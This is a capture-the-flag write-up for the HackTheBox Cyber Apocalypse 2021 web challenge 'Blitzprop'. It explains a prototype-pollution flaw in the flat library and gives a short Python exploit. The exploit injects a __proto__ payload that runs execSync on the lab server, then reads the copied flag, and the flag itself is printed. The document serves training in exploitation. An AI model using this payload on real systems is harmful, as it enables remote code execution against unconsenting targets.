---
name: Blitzprop (2021)
event: HackTheBox Cyber Apocalypse CTF 2021
category: Web
description: Writeup for Blitzprop (Web) - HackTheBox Cyber Apocalypse CTF (2021) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Blitzprop

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/vqR4i730soY/0.jpg)](https://youtu.be/vqR4i730soY?t=952s "HTB Cyber Apocalypse CTF 2021: Blitzprop")

## Challenge Description

> To exploit this, you need to use a ‘prototype pollution’ vulnerability within the flat library in order to gain RCE against the target. This requires a request to the server to 'pollute' the JavaScript objects, then a second request to trigger the payload. Overall, it was a really interesting box!

## Solution

{% code overflow="wrap" %}
```py
from pwn import *
import requests

TARGET_URL = 'http://188.166.172.13:31177'

# https://blog.p6.is/AST-Injection/
result = requests.post(TARGET_URL + '/api/submit', json={
    "song.name": "The Goose went wild",
    "__proto__.block": {
        "type": "Text",
        "line": "process.mainModule.require('child_process').execSync(`cp flagz8gWv static/flag`)"
    }
})

flag = requests.get(TARGET_URL + '/static/flag').text
success(flag)
```
{% endcode %}

Flag: `CHTB{p0llute_with_styl3}`
